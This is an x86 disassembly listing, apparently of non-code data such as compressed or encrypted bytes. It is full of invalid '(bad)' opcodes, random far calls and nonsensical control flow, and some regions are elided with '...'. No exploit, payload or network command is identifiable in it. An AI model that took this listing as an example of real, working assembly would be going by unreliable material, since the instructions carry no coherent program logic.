  41f6ee:	sbb    eax,0x4e5dd677
  41f6f3:	jb     0x41f6ff
  41f6f5:	fsub   st,st(3)
  41f6f7:	inc    eax
  41f6f8:	loopne 0x41f744
  41f6fa:	push   esi
  41f6fb:	fadd   DWORD PTR [edx]
  41f6fd:	mov    ch,0xc8
  41f6ff:	inc    esp
  41f700:	xchg   edx,eax
  41f701:	dec    esp
  41f702:	xor    DWORD PTR [eax],esi
  41f704:	lods   al,BYTE PTR es:[esi]
  41f706:	sbb    eax,esp
  41f708:	and    BYTE PTR [esi],0x93
  41f70b:	adc    BYTE PTR [esi+0x5165fbc0],al
  41f711:	and    DWORD PTR [esi],ebx
  41f713:	jbe    0x41f70d
  41f715:	jno    0x41f779
  41f717:	lods   eax,DWORD PTR ds:[esi]
  41f718:	dec    esi
  41f719:	call   0x3a66:0xd88a47f8
  41f720:	in     al,0xd3
  41f722:	aaa    
  41f723:	push   edi
  41f724:	dec    ebp
  41f725:	sub    eax,DWORD PTR [edi-0x7e]
  41f728:	leave  
  41f729:	ins    DWORD PTR es:[edi],dx
  41f72a:	push   edi
  41f72b:	inc    ebp
  41f72c:	test   BYTE PTR [edx],bl
  41f72e:	das    
  41f72f:	xor    ah,ch
  41f731:	ror    BYTE PTR [esi-0x2a],0x43
  41f735:	mov    ?,WORD PTR [esi]
  41f737:	cmp    BYTE PTR [ecx-0x448d43f3],dh
  41f73d:	sub    cl,BYTE PTR [edi+ecx*2+0x2966c3bf]
  41f744:	add    ch,BYTE PTR [ebp-0x4f]
  41f747:	pusha  
  41f748:	bsr    eax,DWORD PTR [ebp-0x11]
  41f74c:	dec    ecx
  41f74d:	repz cld 
  41f74f:	mov    edi,0xcd4e90b5
  41f754:	jno    0x41f754
  41f756:	adc    eax,0xf913cfca
  41f75b:	das    
  41f75c:	sbb    ch,BYTE PTR [edi+0x44]
  41f75f:	test   eax,0x52c5bf5a
  41f764:	popa   
  41f765:	jp     0x41f759
  41f767:	push   eax
  41f768:	jb     0x41f70d
  41f76a:	jge    0x41f779
  41f76c:	mov    eax,0xdf
	...
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xcdb:0x246c62d2
  41f7e5:	lahf   
  41f7e6:	addr16 push edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	push   edi
  41f7ef:	cmp    ecx,esp
  41f7f1:	aad    0x71
  41f7f3:	xor    BYTE PTR [ecx+ebx*1-0x624491f1],dh
  41f7fa:	ins    DWORD PTR es:[edi],dx
  41f7fb:	das    
  41f7fc:	jle    0x41f839
  41f7fe:	add    esp,DWORD PTR [edx-0x4a]
  41f801:	jae    0x41f7b7
  41f803:	jb     0x41f7d0
  41f805:	rcl    BYTE PTR [ecx+0x3c],1
  41f808:	sub    al,0xcc
  41f80a:	jae    0x41f86d
  41f80c:	sub    DWORD PTR ds:0xf772c065,ebx
  41f812:	adc    al,0x27
  41f814:	sbb    al,0x3f
  41f816:	sub    DWORD PTR [ebx-0x5f639cd8],esi
  41f81c:	popf   
  41f81d:	imul   ecx,DWORD PTR [edx+0x14bd626e],0xd98a5d
  41f827:	rol    BYTE PTR [esi],cl
  41f829:	and    BYTE PTR [ecx+0x38],bl
  41f82c:	pop    edi
  41f82d:	and    eax,0x915e8538
  41f832:	mov    eax,ds:0x9ccf4393
  41f837:	mov    al,ds:0xe1e5c160
  41f83c:	lds    edx,FWORD PTR [edi]
  41f83e:	aam    0x19
  41f840:	dec    esp
  41f841:	rol    bl,cl
  41f843:	adc    DWORD PTR [esp+edi*4-0x32e5ccff],edx
  41f84a:	sti    
  41f84b:	sbb    esi,DWORD PTR [edi]
  41f84d:	stos   DWORD PTR es:[edi],eax
  41f84e:	sbb    cl,cl
  41f850:	sbb    edx,esp
  41f852:	xor    cl,BYTE PTR [ebp-0x4f]
  41f855:	in     eax,dx
  41f856:	xor    esi,esi
  41f858:	add    al,0xb5
  41f85a:	nop
  41f85b:	fwait
  41f85c:	push   eax
  41f85d:	lods   eax,DWORD PTR ds:[esi]
  41f85e:	and    dh,dh
  41f860:	aaa    
  41f861:	push   edx
  41f862:	push   edi
  41f863:	ret    
  41f864:	add    eax,0xfa72b86
  41f869:	push   esi
  41f86a:	fwait
  41f86b:	inc    esi
  41f86c:	gs sub eax,0x53f773d1
  41f872:	ja     0x41f85a
  41f874:	push   ebx
  41f875:	in     al,0xc6
  41f877:	cdq    
  41f878:	leave  
  41f879:	rcr    BYTE PTR [ecx+0x74],cl
  41f87c:	hlt    
  41f87d:	adc    ebx,DWORD PTR [esi]
  41f87f:	popa   
  41f880:	add    ebp,DWORD PTR [ecx-0x4cf7ebc1]
  41f886:	in     al,0xe4
  41f888:	lahf   
  41f889:	icebp  
  41f88a:	or     DWORD PTR [ebp-0x5868a473],eax
  41f890:	lea    ecx,[eax]
  41f892:	adc    BYTE PTR [ecx+0x4f],ch
  41f895:	gs test ch,0xfd
  41f899:	lods   eax,DWORD PTR ds:[esi]
  41f89a:	outs   dx,DWORD PTR ds:[esi]
  41f89b:	ficomp WORD PTR [edi+0x4c]
  41f89e:	xor    ebp,DWORD PTR [eax+edi*1]
  41f8a1:	mov    cl,0xe0
  41f8a3:	xchg   edi,eax
  41f8a4:	adc    ch,BYTE PTR [esp+eax*4]
  41f8a7:	imul   DWORD PTR [edi]
  41f8a9:	and    al,0x3e
  41f8ab:	adc    eax,0xecfc2d3f
  41f8b0:	retf   
  41f8b1:	pushf  
  41f8b2:	repnz pop ebp
  41f8b4:	dec    esp
  41f8b5:	xchg   BYTE PTR [edx+0x1e565a8d],bh
  41f8bb:	mov    ebp,0x6129a4c
  41f8c0:	jle    0x41f8b3
  41f8c2:	sti    
  41f8c3:	fsubr  DWORD PTR [edi]
  41f8c5:	test   al,0xf5
  41f8c7:	rcr    ecx,cl
  41f8c9:	push   ecx
  41f8ca:	(bad)
  41f8cd:	cmc    
  41f8ce:	(bad)  
  41f8cf:	jle    0x41f897
  41f8d1:	fcom   DWORD PTR [ebx]
  41f8d3:	fld    TBYTE PTR [eax+0x26bd301e]
  41f8d9:	mov    ah,0x9
  41f8db:	lahf   
  41f8dc:	retf   0xa0dd
  41f8df:	or     DWORD PTR [ebx+0x373f1439],0x4317b362
  41f8e9:	pop    ds
  41f8ea:	or     eax,0x10f527
	...
  41f953:	add    BYTE PTR [eax],al
  41f955:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	and    BYTE PTR [ebp-0x31],bl
  41f965:	sub    esp,DWORD PTR [edi+0x53]
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	out    0x23,eax
  41f970:	and    al,0xd
  41f972:	xor    eax,DWORD PTR [edx+0x43]
  41f975:	in     eax,dx
  41f976:	je     0x41f97b
  41f978:	jmp    0x469d012c
  41f97d:	push   0xd01fc4a2
  41f982:	mov    eax,0x90c28c0f
  41f987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f988:	mov    al,ds:0xf6176dd9
  41f98d:	inc    eax
  41f98e:	adc    BYTE PTR [ebx+0x60],dl
  41f991:	push   esp
  41f992:	in     eax,0x4a
  41f994:	in     al,dx
  41f995:	xchg   esi,eax
  41f996:	int3   
  41f997:	push   ebx
  41f998:	or     bl,dl
  41f99a:	mov    ds,WORD PTR [ecx-0x5]
  41f99d:	es pop ecx
  41f99f:	push   ebx
  41f9a0:	mov    edx,cs
  41f9a2:	cs stos DWORD PTR es:[edi],eax
  41f9a4:	(bad)  
  41f9a5:	enter  0xf08f,0xed
  41f9a9:	jecxz  0x41f96a
  41f9ab:	xchg   DWORD PTR [esi+0x59],ebx
  41f9ae:	lea    ecx,[eax+0x66ebc6ea]
  41f9b4:	cdq    
  41f9b5:	nop
  41f9b6:	test   DWORD PTR [ebx-0x40],esi
  41f9b9:	pushf  
  41f9ba:	retf   0xe34
  41f9bd:	fidiv  WORD PTR [esi]
  41f9bf:	xchg   ebp,eax
  41f9c0:	loope  0x41f9e6
  41f9c2:	adc    DWORD PTR [eax+0x526ccd17],esi
  41f9c8:	push   eax
  41f9c9:	adc    eax,0x63e19704
  41f9ce:	dec    ecx
  41f9cf:	inc    esp
  41f9d0:	lods   eax,DWORD PTR ds:[esi]
  41f9d1:	mov    al,ds:0x11b4e567
  41f9d6:	ins    DWORD PTR es:[edi],dx
  41f9d7:	jmp    0x17427d5a
  41f9dc:	or     al,0x2e
  41f9de:	cmp    ecx,esi
  41f9e0:	mov    edi,0x613fc686
  41f9e5:	inc    ebx
  41f9e6:	outs   dx,DWORD PTR ds:[esi]
  41f9e7:	inc    eax
  41f9e8:	dec    edx
  41f9e9:	mov    edx,0x7f4e69df
  41f9ee:	add    eax,0x547ff09a
  41f9f3:	in     al,0xd9
  41f9f5:	pop    es
  41f9f6:	lock cli 
  41f9f8:	push   cs
  41f9f9:	jno    0x41f9c9
  41f9fb:	jne    0x41f9de
  41f9fd:	aaa    
  41f9fe:	adc    bl,BYTE PTR [ecx-0x1b9f2389]
  41fa04:	mov    ds:0x1af87c89,eax
  41fa09:	inc    ecx
  41fa0a:	cdq    
  41fa0b:	sbb    DWORD PTR [ecx+0x38e5eeb6],eax
  41fa11:	call   0xe902:0xacc7e9f3
  41fa18:	inc    esi
  41fa19:	sub    eax,0x501c7655
  41fa1e:	xor    ch,0x2f
  41fa21:	xchg   edi,eax
  41fa22:	mov    esi,0x9b2e6940
  41fa27:	ror    DWORD PTR [edi+0x53921354],cl
  41fa2d:	xchg   edi,eax
  41fa2e:	inc    ebx
  41fa2f:	test   eax,0xc1245c0c
  41fa34:	mov    ds:0xd5c71991,eax
  41fa39:	jno    0x41fab8
  41fa3b:	loope  0x41fa0e
  41fa3d:	and    esi,DWORD PTR [eax+0x45dac91d]
  41fa43:	sub    DWORD PTR [ecx+0x18a4467a],edx
  41fa49:	jo     0x41f9ec
  41fa4b:	fsubr  DWORD PTR [edi]
  41fa4d:	xor    BYTE PTR [ecx+0x3e],0xa8
  41fa51:	mov    ecx,0x5a7fe864
  41fa56:	aas    
  41fa57:	leave  
  41fa58:	outs   dx,DWORD PTR ds:[esi]
  41fa59:	sub    cl,ah
  41fa5b:	nop
  41fa5c:	xor    edx,esi
  41fa5e:	or     BYTE PTR [ecx],dh
  41fa60:	out    0x62,al
  41fa62:	dec    edi
  41fa63:	cwde   
  41fa64:	and    edi,DWORD PTR [esi]
  41fa66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa67:	dec    eax
  41fa68:	loop   0x41fa29
  41fa6a:	mov    ecx,DWORD PTR [edx+0x6771]
	...
  41fad4:	add    BYTE PTR [eax],al
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x8e89506e
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	retf   0xe638
  41faf1:	push   esi
  41faf2:	es hlt 
  41faf4:	cdq    
  41faf5:	jmp    0x41fab7
  41faf7:	rol    BYTE PTR [ebx+0x3ef08779],cl
  41fafd:	js     0x41fb69
  41faff:	cmc    
  41fb00:	push   0xa2f61d3c
  41fb05:	inc    ebx
  41fb06:	jecxz  0x41fa93
  41fb08:	xchg   edx,eax
  41fb09:	fs stos BYTE PTR es:[edi],al
  41fb0b:	sbb    dh,BYTE PTR [eax]
  41fb0d:	iret   
  41fb0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb0f:	jno    0x41fb00
  41fb11:	popf   
  41fb12:	je     0x41fb65
  41fb14:	mov    bh,bh
  41fb16:	mov    dh,0xf9
  41fb18:	aaa    
  41fb19:	out    0xf1,al
  41fb1b:	xor    eax,0xa1690698
  41fb20:	mov    WORD PTR [ebp+ecx*4+0x123da35e],es
  41fb27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb28:	jb     0x41fad5
  41fb2a:	jno    0x41fade
  41fb2c:	in     al,0x40
  41fb2e:	xlat   BYTE PTR ds:[ebx]
  41fb2f:	jecxz  0x41faf8
  41fb31:	mov    es,edx
  41fb33:	mov    esi,0x96f83bec
  41fb38:	or     al,0x72
  41fb3a:	(bad)  
  41fb3c:	fwait
  41fb3d:	mov    edi,0xbab60b76
  41fb42:	jle    0x41fb3b
  41fb44:	cmc    
  41fb45:	mov    DWORD PTR [ecx],edi
  41fb47:	stos   DWORD PTR es:[edi],eax
  41fb48:	rcl    DWORD PTR [esi-0x5c],1
  41fb4b:	(bad)
  41fb4e:	jbe    0x41fb8f
  41fb50:	aam    0x43
  41fb52:	push   es
  41fb53:	add    al,0x9d
  41fb55:	pop    edi
  41fb56:	int    0x77
  41fb58:	mov    al,ds:0xce8315f5
  41fb5d:	in     al,0x4
  41fb5f:	js     0x41fb7c
  41fb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb62:	push   cs
  41fb63:	jge    0x41fb0b
  41fb65:	mov    esp,0xf7996f5b
  41fb6a:	inc    ecx
  41fb6b:	jnp    0x41fb17
  41fb6d:	or     DWORD PTR [ecx+ebx*8],ebp
  41fb70:	pop    ss
  41fb71:	mov    ah,0xb7
  41fb73:	xchg   ebp,eax
  41fb74:	mov    ch,0xd7
  41fb76:	es out 0x1e,eax
  41fb79:	pop    es
  41fb7a:	jg     0x41fbcd
  41fb7c:	adc    al,0x73
  41fb7e:	cmp    edi,DWORD PTR [ecx-0x3e871c5]
  41fb84:	jno    0x41fbed
  41fb86:	mov    ds:0x8f1713d5,al
  41fb8b:	push   0xffffffec
  41fb8d:	or     BYTE PTR [edi+edx*1+0x3],ah
  41fb91:	and    BYTE PTR [eax],0xe7
  41fb94:	push   esp
  41fb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb96:	sbb    al,0x27
  41fb98:	and    eax,0x31303097
  41fb9d:	ret    0xbe49
  41fba0:	es cld 
  41fba2:	fstp   QWORD PTR [esi+0x38433e0c]
  41fba8:	jecxz  0x41fbd9
  41fbaa:	jg     0x41fb6f
  41fbac:	call   0x1906:0xf2f06627
  41fbb3:	jecxz  0x41fbc9
  41fbb5:	xchg   BYTE PTR [edx+ebx*8],cl
  41fbb8:	mov    ebx,0x4f978975
  41fbbd:	ds loope 0x41fbbc
  41fbc0:	nop
  41fbc1:	xor    ah,cl
  41fbc3:	test   al,0xec
  41fbc5:	pop    eax
  41fbc6:	xor    edx,edi
  41fbc8:	xchg   ecx,eax
  41fbc9:	inc    esi
  41fbca:	or     eax,0x315fb2fa
  41fbcf:	sbb    BYTE PTR [ebx+0x32b67d8c],0x48
  41fbd6:	test   al,0x7
  41fbd8:	stos   BYTE PTR es:[edi],al
  41fbd9:	pop    ecx
  41fbda:	fnsave [edx-0x2e]
  41fbdd:	ror    BYTE PTR [esi+0x4c8d7e03],0x21
  41fbe4:	leave  
  41fbe5:	retf   
  41fbe6:	pop    ebx
  41fbe7:	cwde   
  41fbe8:	cli    
  41fbe9:	dec    ebp
  41fbea:	pop    ebx
  41fbeb:	and    eax,0x3aae
	...
  41fc54:	add    BYTE PTR [eax],al
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	aam    0x13
  41fc64:	add    dl,bl
  41fc66:	addr16 push ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	scas   eax,DWORD PTR es:[edi]
  41fc6f:	mov    edi,0xba32a004
  41fc74:	es loopne 0x41fbfc
  41fc77:	ret    
  41fc78:	ins    DWORD PTR es:[edi],dx
  41fc79:	push   eax
  41fc7a:	sub    al,0xec
  41fc7c:	jmp    0x41fcba
  41fc7e:	cmp    DWORD PTR [ebp-0x54],esp
  41fc81:	es sti 
  41fc83:	retf   
  41fc84:	cs xchg ecx,eax
  41fc86:	jmp    0x41fc0e
  41fc88:	add    bh,bh
  41fc8a:	mov    ch,0xb
  41fc8c:	aam    0xae
  41fc8e:	sahf   
  41fc8f:	imul   ebp,ebx,0xf33e0c58
  41fc95:	pop    edi
  41fc96:	push   es
  41fc97:	sti    
  41fc98:	pop    es
  41fc99:	push   ecx
  41fc9a:	or     ebx,ebx
  41fc9c:	retf   
  41fc9d:	cmc    
  41fc9e:	mov    ds:0xaced2375,eax
  41fca3:	cs ss sbb dl,cl
  41fca7:	mov    bh,0x30
  41fcaa:	dec    ebx
  41fcab:	mov    eax,0x9b16adc8
  41fcb0:	ja     0x41fc8a
  41fcb2:	sbb    dh,BYTE PTR [ebp+0x36ce65cf]
  41fcb8:	ret    0xccc8
  41fcbb:	retf   
  41fcbc:	dec    esi
  41fcbd:	mov    al,ds:0x71558b04
  41fcc2:	push   esi
  41fcc3:	mov    ebx,0x2eaf242e
  41fcc8:	adc    ecx,DWORD PTR [eax-0x5d01b927]
  41fcce:	xchg   ebp,eax
  41fccf:	jno    0x41fcbd
  41fcd1:	mov    al,ds:0x74ea39e7
  41fcd6:	jge    0x41fd4e
  41fcd8:	lahf   
  41fcd9:	jno    0x41fd38
  41fcdb:	ret    
  41fcdc:	imul   esi,DWORD PTR [eax+0xd7dccf2],0xffffffcb
  41fce3:	repz inc ebp
  41fce5:	and    al,0x19
  41fce7:	iret   
  41fce8:	cmc    
  41fce9:	(bad)  
  41fcea:	pop    esi
  41fceb:	xlat   BYTE PTR ds:[ebx]
  41fcec:	test   DWORD PTR [edx],ebx
  41fcee:	jmp    0x41fcc5
  41fcf0:	push   ss
  41fcf1:	ins    DWORD PTR es:[edi],dx
  41fcf2:	fmul   st,st(1)
  41fcf4:	xor    al,0x82
  41fcf6:	xlat   BYTE PTR ds:[ebx]
  41fcf7:	jmp    0x121a1ed8
  41fcfc:	(bad)  
  41fcfd:	call   0x87ce:0xc4688c79
  41fd04:	mov    dh,0x77
  41fd06:	sub    BYTE PTR [edi-0x52],al
  41fd09:	fistp  DWORD PTR [ecx+0x5b]
  41fd0c:	xor    ebp,DWORD PTR ds:[edi]
  41fd0f:	rol    BYTE PTR [eax],1
  41fd11:	shl    DWORD PTR [edi+0x1d],cl
  41fd14:	mov    ah,0x7b
  41fd16:	das    
  41fd17:	mov    eax,ds:0x67cd7927
  41fd1c:	or     BYTE PTR [ecx+0x4e3ed51f],al
  41fd22:	inc    esp
  41fd23:	test   BYTE PTR [edx+0x7],ah
  41fd26:	(bad)  
  41fd27:	jns    0x41fd79
  41fd29:	mov    al,ds:0xd3a19944
  41fd2e:	mov    dl,dh
  41fd30:	mov    ah,0x58
  41fd32:	(bad)  
  41fd34:	xor    eax,DWORD PTR [edx]
  41fd36:	arpl   WORD PTR [eax-0x19],sp
  41fd39:	aam    0x59
  41fd3b:	mov    al,0x11
  41fd3d:	test   eax,0xca5f1db1
  41fd42:	loop   0x41fd7a
  41fd44:	fwait
  41fd45:	adc    edx,DWORD PTR ds:0xa3432e80
  41fd4b:	inc    ebx
  41fd4c:	jl     0x41fd32
  41fd4e:	adc    al,0x1c
  41fd50:	jp     0x41fd24
  41fd52:	daa    
  41fd53:	dec    ebx
  41fd54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd55:	pop    ebp
  41fd56:	fmul   QWORD PTR [esi+0x6013fc63]
  41fd5c:	cmc    
  41fd5d:	cli    
  41fd5e:	inc    edi
  41fd5f:	push   edx
  41fd60:	jmp    0x59a88c1f
  41fd65:	mov    dl,0x4
  41fd67:	jns    0x41fd1a
  41fd69:	test   eax,0xd56af0ed
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	or     ecx,DWORD PTR [edi+0x56678e12]
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	and    BYTE PTR [edx],bl
  41fdf0:	sbb    cl,BYTE PTR [ecx+0x78]
  41fdf3:	xchg   sp,bx
  41fdf6:	pushf  
  41fdf7:	aaa    
  41fdf8:	cdq    
  41fdf9:	add    ebx,DWORD PTR [ebp+0x3f99e016]
  41fdff:	sub    BYTE PTR [ecx],ch
  41fe01:	cld    
  41fe02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe03:	inc    edx
  41fe04:	jne    0x41fd9c
  41fe06:	dec    eax
  41fe07:	int    0xce
  41fe09:	fst    DWORD PTR [eax+0x75e06e2c]
  41fe0f:	sbb    al,0x80
  41fe11:	inc    ecx
  41fe12:	jle    0x41fe2d
  41fe14:	pop    esi
  41fe15:	shl    BYTE PTR [ebp+0x479efb74],cl
  41fe1b:	xor    esi,ebp
  41fe1d:	jno    0x41fde0
  41fe1f:	and    esi,DWORD PTR [edx]
  41fe21:	mov    ds:0x385acfe,al
  41fe26:	and    eax,0xde1c8309
  41fe2b:	and    cl,bh
  41fe2d:	outs   dx,DWORD PTR ds:[esi]
  41fe2e:	and    DWORD PTR [bp+si-0x80],ebp
  41fe32:	mov    al,ds:0xd10c4365
  41fe37:	(bad)  
  41fe38:	std    
  41fe39:	or     DWORD PTR [eax],ebp
  41fe3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe3c:	aas    
  41fe3d:	xchg   edx,eax
  41fe3e:	mov    dl,0x7b
  41fe40:	mov    eax,0x5cec9e19
  41fe45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe46:	outs   dx,BYTE PTR ds:[esi]
  41fe47:	mov    bh,0xab
  41fe49:	in     al,dx
  41fe4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4b:	adc    BYTE PTR [ebx+esi*4-0x6],al
  41fe4f:	(bad)  
  41fe51:	sahf   
  41fe52:	add    esi,DWORD PTR [ebp+0x1a30c770]
  41fe58:	cmp    eax,0xdd66fcfb
  41fe5d:	dec    ecx
  41fe5e:	(bad)  
  41fe5f:	loope  0x41fe51
  41fe61:	clc    
  41fe62:	jnp    0x41feb6
  41fe64:	mov    edx,0xd920294
  41fe69:	cmp    dl,bh
  41fe6b:	mov    cl,0x76
  41fe6d:	ss push cs
  41fe6f:	xchg   esi,eax
  41fe70:	out    0xc9,eax
  41fe72:	mov    ch,0xa
  41fe74:	jge    0x41fe3b
  41fe76:	lock add ah,BYTE PTR [ebx]
  41fe79:	sub    al,0xbf
  41fe7b:	ret    0x3ba
  41fe7e:	(bad)  
  41fe80:	xor    edi,ebx
  41fe82:	jmp    0x41fe3b
  41fe84:	adc    esp,DWORD PTR [ebp-0x7bf254a7]
  41fe8a:	sub    esi,DWORD PTR [ebx-0x5df4767d]
  41fe90:	sbb    DWORD PTR [ecx+0x4eb24bbc],ecx
  41fe96:	(bad)  
  41fe97:	fnstcw WORD PTR [ebx]
  41fe99:	mov    eax,ds:0x92532aa
  41fe9e:	push   ebx
  41fe9f:	and    bl,BYTE PTR [edi+0x46]
  41fea2:	imul   ecx,DWORD PTR [edi-0x29bf63c7],0x6d73ee27
  41feac:	adc    al,0xb5
  41feae:	xlat   BYTE PTR ds:[ebx]
  41feaf:	(bad)  
  41feb0:	push   ds
  41feb1:	rcr    cl,cl
  41feb3:	pop    ebx
  41feb4:	dec    esi
  41feb5:	rcl    DWORD PTR [ebx-0x3f],cl
  41feb8:	sbb    esp,DWORD PTR [ecx-0x76]
  41febb:	add    eax,DWORD PTR [eax-0x72]
  41febe:	push   esp
  41febf:	in     al,0x47
  41fec1:	dec    edx
  41fec2:	lods   al,BYTE PTR ds:[esi]
  41fec3:	xor    al,0x4
  41fec5:	jno    0x41fee5
  41fec7:	je     0x41fe8c
  41fec9:	xchg   esi,eax
  41feca:	stos   BYTE PTR es:[edi],al
  41fecb:	jge    0x41ff34
  41fecd:	les    esi,FWORD PTR [eax]
  41fecf:	push   DWORD PTR [edx-0x1a]
  41fed2:	rol    DWORD PTR [esi],cl
  41fed4:	xor    ebp,DWORD PTR [eax]
  41fed6:	in     eax,dx
  41fed7:	out    dx,eax
  41fed8:	lods   eax,DWORD PTR ds:[esi]
  41fed9:	xchg   esp,eax
  41feda:	test   ah,dh
  41fedc:	dec    ebx
  41fedd:	aad    0xe8
  41fedf:	cmp    BYTE PTR [ecx+ebp*4+0x62980053],cl
  41fee6:	mov    bl,0x2a
  41fee8:	jae    0x41ff68
  41feea:	test   eax,0xa08c
	...
  41ff54:	add    BYTE PTR [eax],al
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x5d
  41ff63:	sbb    ah,bh
  41ff65:	shl    BYTE PTR [edi+0x57],1
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	(bad)  
  41ff6f:	out    0xac,al
  41ff71:	clc    
  41ff72:	mov    ecx,esp
  41ff74:	jge    0x41ffea
  41ff76:	cmp    al,0xfa
  41ff78:	xor    al,0x83
  41ff7a:	outs   dx,BYTE PTR ds:[esi]
  41ff7b:	push   edi
  41ff7c:	mov    esi,0x631743d1
  41ff81:	or     ah,BYTE PTR [edi]
  41ff83:	push   0x8f289c38
  41ff88:	sahf   
  41ff89:	stc    
  41ff8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff8b:	scas   eax,DWORD PTR es:[edi]
  41ff8c:	cdq    
  41ff8d:	jg     0x41ffe0
  41ff8f:	xchg   ebp,eax
  41ff90:	inc    ebx
  41ff91:	ss dec edx
  41ff93:	mov    dh,0x2d
  41ff95:	sub    al,0x10
  41ff97:	push   esp
  41ff98:	push   edx
  41ff99:	dec    ebp
  41ff9a:	jo     0x41ff3a
  41ff9c:	fs jmp 0xd3e7bc97
  41ffa2:	jg     0x41ff3b
  41ffa4:	and    eax,0xbc84c221
  41ffa9:	fsubr  QWORD PTR [ebx-0x3b8d35be]
  41ffaf:	jbe    0x41ffb1
  41ffb1:	outs   dx,DWORD PTR ds:[si]
  41ffb3:	push   cs
  41ffb4:	dec    ebp
  41ffb5:	sub    al,0x4c
  41ffb7:	push   ecx
  41ffb8:	xchg   edx,eax
  41ffb9:	fisubr WORD PTR [esi+edi*4]
  41ffbc:	ins    BYTE PTR es:[edi],dx
  41ffbd:	pop    ds
  41ffbe:	sub    dl,BYTE PTR [eax+ebp*8]
  41ffc1:	jmp    0x5ae6d0d3
  41ffc6:	pop    eax
  41ffc7:	sub    edi,DWORD PTR ds:0x9de8361c
  41ffcd:	fisub  WORD PTR [ecx+0x1b]
  41ffd0:	aaa    
  41ffd1:	test   edx,0x9dc60bd
  41ffd7:	mov    esp,DWORD PTR [edi]
  41ffd9:	sub    dh,BYTE PTR [ecx-0x623a302c]
  41ffdf:	inc    ebx
  41ffe0:	fidiv  WORD PTR ds:0x32103d70
  41ffe6:	mov    ebx,0x461291b
  41ffeb:	adc    cl,bh
  41ffed:	int3   
  41ffee:	inc    esi
  41ffef:	sbb    al,BYTE PTR [eax+0x1e5c5e2b]
  41fff5:	sub    edi,DWORD PTR [eax]
  41fff7:	xchg   BYTE PTR [edi-0x3b50313f],ch
  41fffd:	ins    BYTE PTR es:[edi],dx
  41fffe:	dec    esi
  41ffff:	retf   0xbb7
  420002:	jmp    0x497813e
  420007:	sub    esi,esi
  420009:	clc    
  42000a:	call   0xe203e52a
  42000f:	mov    dl,0xe3
  420011:	(bad)  
  420012:	cli    
  420013:	out    0x94,eax
  420015:	je     0x41ffc1
  420017:	out    0xed,eax
  420019:	frstor [ebx+edx*2]
  42001c:	sub    DWORD PTR [ebp-0xdb7fb04],eax
  420022:	fisttp WORD PTR [esi-0x6]
  420025:	ror    esi,1
  420027:	ins    BYTE PTR es:[edi],dx
  420028:	imul   ebp,DWORD PTR [esi],0xabfca4ad
  42002e:	cmp    ebx,DWORD PTR ss:[ebp-0x3c]
  420032:	fadd   QWORD PTR [edi-0x4c]
  420035:	pop    esp
  420036:	clc    
  420037:	add    dl,BYTE PTR [ecx-0x56aebf02]
  42003d:	int    0x73
  42003f:	arpl   sp,sp
  420041:	outs   dx,BYTE PTR ds:[esi]
  420042:	dec    edi
  420043:	adc    al,0x95
  420045:	adc    al,0x98
  420047:	push   ecx
  420048:	aad    0x50
  42004a:	ins    BYTE PTR es:[edi],dx
  42004b:	dec    edx
  42004c:	stos   BYTE PTR es:[edi],al
  42004d:	mov    ds:0x3322a271,eax
  420052:	fsub   DWORD PTR [edx+0x6cc37458]
  420058:	and    al,0x5f
  42005a:	icebp  
  42005b:	xchg   esi,eax
  42005c:	add    eax,0x2b3139d9
  420061:	add    DWORD PTR [esi-0x20],ebx
  420064:	out    dx,al
  420065:	mov    eax,ds:0x184ecd
  42006a:	pop    edx
  42006b:	mov    esi,0xc3f4
	...
  4200d4:	add    BYTE PTR [eax],al
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
